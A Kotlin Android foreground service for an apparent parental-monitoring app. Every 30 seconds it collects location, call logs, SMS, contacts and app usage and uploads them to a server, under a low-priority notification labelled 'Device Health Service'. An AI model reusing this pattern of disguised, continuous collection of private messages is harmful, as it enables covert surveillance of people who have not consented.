package com.parental.agent.services

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.parental.agent.collectors.appusage.AppUsageCollector
import com.parental.agent.collectors.calls.CallCollector
import com.parental.agent.collectors.contacts.ContactCollector
import com.parental.agent.collectors.location.LocationCollector
import com.parental.agent.collectors.sms.SmsCollector
import com.parental.agent.data.local.AppDatabase
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.sync.ApiConstants
import com.parental.agent.sync.SyncPayload
import kotlinx.coroutines.*
import org.json.JSONObject

class ForegroundService : Service() {

    companion object {
        private const val TAG = "ForegroundService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "device_health_services_channel"
        private const val COLLECTION_INTERVAL_MS = 30 * 1000L // 30s interval for background telemetry sync
    }

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onCreate() {
        super.onCreate()
        startServiceForeground()
        startTelemetryCollectorsLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startTelemetryCollectorsLoop() {
        serviceScope.launch {
            val locationCollector = LocationCollector(this@ForegroundService)
            val callCollector = CallCollector(this@ForegroundService)
            val smsCollector = SmsCollector(this@ForegroundService)
            val contactCollector = ContactCollector(this@ForegroundService)
            val appUsageCollector = AppUsageCollector(this@ForegroundService)

            while (isActive) {
                try {
                    val locCount = locationCollector.collect()
                    val callCount = callCollector.collect()
                    val smsCount = smsCollector.collect()
                    val contactCount = contactCollector.collect()
                    val usageCount = appUsageCollector.collect()

                    if (locCount > 0 || callCount > 0 || smsCount > 0 || contactCount > 0 || usageCount > 0) {
                        Log.d(TAG, "New Telemetry collected: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount")
                    }

                    // Perform network sync upload ONLY for unsynced events (WHERE isSynced = 0)
                    performDirectNetworkSync()

                } catch (e: Exception) {
                    Log.e(TAG, "Error in telemetry collection loop: ${e.message}", e)
                }
                delay(COLLECTION_INTERVAL_MS)
            }
        }
    }

    private suspend fun performDirectNetworkSync() {
        try {
            val database = AppDatabase.getInstance(this@ForegroundService)
            val prefs = AppPreferences(this@ForegroundService)
            val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 50)

            if (unsyncedEvents.isNotEmpty()) {
                val activeDeviceId = prefs.getDeviceId()

                val eventPayloads = unsyncedEvents.map { entity ->
                    val payloadMap = try {
                        val json = JSONObject(entity.payloadJson)
                        val map = mutableMapOf<String, Any?>()
                        json.keys().forEach { key -> map[key] = json.get(key) }
                        map
                    } catch (e: Exception) {
                        emptyMap<String, Any?>()
                    }

                    val eventDevId = if (entity.deviceId.isBlank() || entity.deviceId == "dev_local_agent") activeDeviceId else entity.deviceId

                    mapOf(
                        "eventId" to entity.eventId,
                        "deviceId" to eventDevId,
                        "source" to entity.source,
                        "eventType" to entity.eventType,
                        "timestamp" to entity.timestamp,
                        "collectionMethod" to entity.collectionMethod,
                        "payload" to payloadMap
                    )
                }

                val payload = SyncPayload(
                    deviceId = activeDeviceId,
                    events = eventPayloads
                )

                Log.i(TAG, "Posting ${unsyncedEvents.size} unsynced telemetry event(s) to server for device $activeDeviceId...")
                val response = ApiConstants.apiService.syncEvents(payload)

                if (response.isSuccessful && response.body()?.success == true) {
                    val body = response.body()
                    val serverConfirmedIds = body?.syncedEventIds.orEmpty()
                    val localEventIds = unsyncedEvents.map { it.eventId }
                    val confirmedSyncedIds = localEventIds.filter { id -> serverConfirmedIds.contains(id) }

                    if (confirmedSyncedIds.isNotEmpty()) {
                        database.eventDao().markEventsSynced(confirmedSyncedIds)
                        Log.i(TAG, "SUCCESS: Server confirmed ACK for ${confirmedSyncedIds.size} event(s)!")
                    }
                } else {
                    Log.w(TAG, "Network Upload returned HTTP status: ${response.code()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error performing network sync: ${e.message}")
        }
    }

    private fun startServiceForeground() {
        try {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Device Health & Protection Services",
                    NotificationManager.IMPORTANCE_MIN
                ).apply {
                    description = "Monitors device status & protection rules"
                    setShowBadge(false)
                }
                notificationManager.createNotificationChannel(channel)
            }

            val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Device Health Service")
                .setContentText("ChildCare protection active")
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID, 
                    notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service notification: ${e.message}")
        }
    }
}
